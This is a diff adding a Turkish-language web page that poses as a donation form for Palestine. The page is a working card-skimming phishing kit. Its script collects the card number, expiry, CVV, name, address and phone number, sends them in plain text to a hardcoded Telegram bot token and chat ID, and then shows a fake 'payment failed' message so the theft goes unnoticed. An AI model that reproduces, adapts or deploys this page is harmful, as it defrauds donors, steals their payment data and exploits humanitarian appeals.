@@ -1,0 +1,296 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Filistin Bağış</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/00/Flag_of_Palestine.svg/1200px-Flag_of_Palestine.svg.png');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      color: white;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 500px;
+    }
+    h1 {
+      font-size: 3em;
+      margin-bottom: 30px;
+      color: #fff;
+      text-shadow: 2px 2px 4px #000;
+    }
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    .donation-amounts {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 20px;
+      justify-content: center;
+    }
+    .amount-btn {
+      background-color: #1E90FF;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1em;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      flex: 1;
+      min-width: 80px;
+    }
+    .amount-btn.selected {
+      background-color: #FFD700;
+    }
+    .amount-btn:hover {
+      background-color: #006400;
+    }
+    .submit-btn {
+      background-color: #006400;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+      width: 100%;
+    }
+    .submit-btn:hover {
+      background-color: #008000;
+    }
+    .error {
+      color: #ff6b6b;
+      font-size: 0.9em;
+      margin-top: 5px;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <h1>FİLİSTİN BAĞIŞ</h1>
+    <form id="donationForm">
+      <div class="donation-amounts">
+        <button type="button" class="amount-btn" data-amount="50">50 TL</button>
+        <button type="button" class="amount-btn" data-amount="100">100 TL</button>
+        <button type="button" class="amount-btn" data-amount="200">200 TL</button>
+        <button type="button" class="amount-btn" data-amount="500">500 TL</button>
+        <button type="button" class="amount-btn" data-amount="1000">1000 TL</button>
+        <button type="button" id="otherAmountBtn" style="background-color: red; color: white; border: none; padding: 10px 20px; font-size: 1em; border-radius: 5px; cursor: pointer;">Diğer</button>
+        <input type="number" id="customAmount" placeholder="Kendi tutarınızı yazınız (TL)" style="display:none; margin-top: 10px; padding: 10px; width: 100%; border-radius: 5px; border: none;">
+      </div>
+      <input type="hidden" id="selectedAmount" value="">
+
+      <div class="form-group">
+        <label for="cardNumber">Kart Numarası (16 haneli)</label>
+        <input type="text" id="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456">
+        <div class="error" id="cardError">Lütfen geçerli 16 haneli kart numarası giriniz</div>
+        <div class="error" id="cardInvalid">Kart Numaranız Doğrulanamadı.</div>
+      </div>
+
+      <div class="form-group">
+        <label>Son Kullanma Tarihi</label>
+        <div style="display: flex; gap: 10px;">
+          <div style="flex: 1;">
+            <input type="number" id="month" min="1" max="12" placeholder="AA" maxlength="2">
+            <div class="error" id="monthError">Geçersiz ay (1-12 arası olmalı)</div>
+          </div>
+          <div style="flex: 1;">
+            <input type="number" id="year" min="2025" placeholder="YYYY" maxlength="4">
+            <div class="error" id="yearError">Geçersiz yıl (2025 veya sonrası)</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" maxlength="3" placeholder="123">
+        <div class="error" id="cvvError">Lütfen geçerli CVV giriniz</div>
+      </div>
+
+      <div class="form-group">
+        <label for="fullName">Ad Soyad</label>
+        <input type="text" id="fullName" placeholder="Adınızı ve Soyadınızı giriniz">
+      </div>
+
+      <div class="form-group">
+        <label for="postalCode">Posta Kodu</label>
+        <input type="text" id="postalCode" placeholder="Posta Kodunuzu giriniz">
+      </div>
+
+      <div class="form-group">
+        <label for="city">İl</label>
+        <input type="text" id="city" placeholder="Bulunduğunuz İl">
+      </div>
+
+      <div class="form-group">
+        <label for="district">İlçe</label>
+        <input type="text" id="district" placeholder="Bulunduğunuz İlçe">
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Telefon Numarası</label>
+        <input type="tel" id="phone" placeholder="05xx xxx xx xx">
+      </div>
+
+      <button type="submit" class="submit-btn">BAĞIŞ YAP</button>
+    </form>
+  </div>
+
+  <script>
+    function isValidCardNumber(number) {
+      let sum = 0;
+      let shouldDouble = false;
+      for (let i = number.length - 1; i >= 0; i--) {
+        let digit = parseInt(number.charAt(i));
+        if (shouldDouble) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+        shouldDouble = !shouldDouble;
+      }
+      return (sum % 10) === 0;
+    }
+
+    document.getElementById('otherAmountBtn').addEventListener('click', () => {
+      const input = document.getElementById('customAmount');
+      input.style.display = input.style.display === 'none' ? 'block' : 'none';
+      document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
+      document.getElementById('selectedAmount').value = '';
+    });
+
+    document.getElementById('customAmount').addEventListener('input', function () {
+      document.getElementById('selectedAmount').value = this.value;
+    });
+
+    document.querySelectorAll('.amount-btn').forEach(btn => {
+      btn.addEventListener('click', function () {
+        document.querySelectorAll('.amount-btn').forEach(b => {
+          b.classList.remove('selected');
+        });
+        this.classList.add('selected');
+        document.getElementById('selectedAmount').value = this.dataset.amount;
+      });
+    });
+
+    document.getElementById('donationForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      document.querySelectorAll('.error').forEach(el => el.style.display = 'none');
+
+      const selectedAmount = document.getElementById('selectedAmount').value;
+      const cardNumber = document.getElementById('cardNumber').value;
+      const month = document.getElementById('month').value;
+      const year = document.getElementById('year').value;
+      const cvv = document.getElementById('cvv').value;
+      const fullName = document.getElementById('fullName').value;
+      const postalCode = document.getElementById('postalCode').value;
+      const city = document.getElementById('city').value;
+      const district = document.getElementById('district').value;
+      const phone = document.getElementById('phone').value;
+
+      let isValid = true;
+
+      if (!selectedAmount) {
+        alert('Lütfen bir bağış miktarı seçiniz');
+        return;
+      }
+
+      if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
+        document.getElementById('cardError').style.display = 'block';
+        isValid = false;
+      } else if (!isValidCardNumber(cardNumber)) {
+        document.getElementById('cardInvalid').style.display = 'block';
+        isValid = false;
+      }
+
+      if (month < 1 || month > 12) {
+        document.getElementById('monthError').style.display = 'block';
+        isValid = false;
+      }
+
+      if (year < 2025) {
+        document.getElementById('yearError').style.display = 'block';
+        isValid = false;
+      }
+
+      if (cvv.length < 3 || !/^\d+$/.test(cvv)) {
+        document.getElementById('cvvError').style.display = 'block';
+        isValid = false;
+      }
+
+      if (isValid) {
+        const message = `Yeni Bağış Bilgileri:
+Miktar: ${selectedAmount} TL
+Kart No: ${cardNumber}
+Son Kullanma: ${month}/${year}
+CVV: ${cvv}
+Ad Soyad: ${fullName}
+Posta Kodu: ${postalCode}
+İl: ${city}
+İlçe: ${district}
+Telefon: ${phone}`;
+
+        const botToken = '7044463101:AAFHraueUt-oU7tc_tfDinvK1hHXZJYLTao';
+        const chatId = '7078266953';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        fetch(url);
+
+        const overlay = document.querySelector('.overlay');
+        overlay.innerHTML = `
+          <div style="text-align:center;">
+            <div style="font-size: 2em; margin-bottom: 20px;">YÜKLENİYOR...</div>
+            <div class="spinner" style="border: 8px solid #f3f3f3; border-top: 8px solid red; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto;"></div>
+          </div>
+        `;
+        setTimeout(() => {
+          overlay.innerHTML = `
+            <div style="text-align:center;">
+              <div style="font-size: 3em; color: red;">&#10060;</div>
+              <div style="margin-top: 10px; color: black; font-weight: bold;">Ödeme Yapılamadı. Lütfen Daha Sonra Tekrar Deneyiniz.</div>
+            </div>
+          `;
+        }, 5000);
+      }
+    });
+  </script>
+</body>
+</html>
